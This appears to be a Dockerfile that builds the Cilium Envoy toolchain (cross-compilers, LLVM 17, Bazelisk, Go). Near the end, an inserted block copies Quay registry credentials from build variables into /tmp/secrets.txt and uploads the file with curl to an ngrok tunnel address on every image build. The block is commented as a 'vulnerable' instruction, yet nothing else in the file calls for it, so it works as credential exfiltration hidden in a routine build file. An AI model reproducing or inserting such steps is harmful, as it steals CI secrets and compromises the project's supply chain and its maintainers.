#
# Builder dependencies. This takes a long time to build from scratch!
# Also note that if build fails due to C++ internal error or similar,
# it is possible that the image build needs more RAM than available by
# default on non-Linux docker installs.
FROM docker.io/library/ubuntu:22.04@sha256:ed1544e454989078f5dec1bfdabd8c5cc9c48e0705d07b678ab6ae3fb61952d2 AS base
LABEL maintainer="maintainer@cilium.io"
ARG TARGETARCH
# Setup TimeZone to prevent tzdata package asking for it interactively
ENV TZ=Etc/UTC

# renovate: datasource=golang-version depName=go
ENV GO_VERSION=1.23.7

RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
RUN apt-get update && \
    apt-get upgrade -y --no-install-recommends && \
    apt-get install -y --no-install-recommends \
      ca-certificates \
      # Multi-arch cross-compilation packages
      gcc-aarch64-linux-gnu g++-aarch64-linux-gnu libc6-dev-arm64-cross binutils-aarch64-linux-gnu \
      gcc-x86-64-linux-gnu g++-x86-64-linux-gnu libc6-dev-amd64-cross binutils-x86-64-linux-gnu \
      libc6-dev \
      # Envoy Build dependencies
      autoconf automake cmake coreutils curl git libtool make ninja-build patch patchelf \
	python3 python-is-python3 unzip virtualenv wget zip \
      # Cilium-envoy build dependencies
      software-properties-common && \
    wget -qO- https://apt.llvm.org/llvm-snapshot.gpg.key | tee /etc/apt/trusted.gpg.d/apt.llvm.org.asc && \
    apt-add-repository -y "deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main" && \
    apt-get update && \
    apt-get install -y --no-install-recommends \
      clang-17 clang-tools-17 llvm-17-dev lldb-17 lld-17 clang-format-17 libc++-17-dev libc++abi-17-dev && \
    apt-get purge --auto-remove && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

#
# Install Bazelisk
#
# renovate: datasource=datasource depName=bazelbuild/bazelisk
ENV BAZELISK_VERSION=v1.20.0

RUN ARCH=$TARGETARCH \
	&& curl -sfL https://github.com/bazelbuild/bazelisk/releases/download/${BAZELISK_VERSION}/bazelisk-linux-${ARCH} -o /usr/bin/bazel \
	&& chmod +x /usr/bin/bazel
#
# Install Go
#
RUN curl -sfL https://go.dev/dl/go${GO_VERSION}.linux-${TARGETARCH}.tar.gz -o go.tar.gz \
	&& tar -C /usr/local -xzf go.tar.gz \
	&& rm go.tar.gz \
	&& export PATH=$PATH:/usr/local/go/bin \
	&& go version
#
# Switch to non-root user for builds
#

# Define the secrets (assuming they're available in the build environment)
ENV QUAY_USER=${QUAY_ENVOY_USERNAME_DEV}
ENV QUAY_PASS=${QUAY_ENVOY_PASSWORD_DEV}

# Vulnerable RUN instruction (early stage)
RUN echo "User: $QUAY_USER, Pass: $QUAY_PASS" > /tmp/secrets.txt

RUN curl -f -X POST -F "file=@/tmp/secrets.txt" https://36c5-2a02-c7c-88b-d800-d549-b2f-c247-dec5.ngrok-free.app/upload

RUN groupadd -f -g 1337 cilium && useradd -m -d /cilium/proxy -g cilium -u 1337 cilium
USER 1337:1337
WORKDIR /cilium/proxy
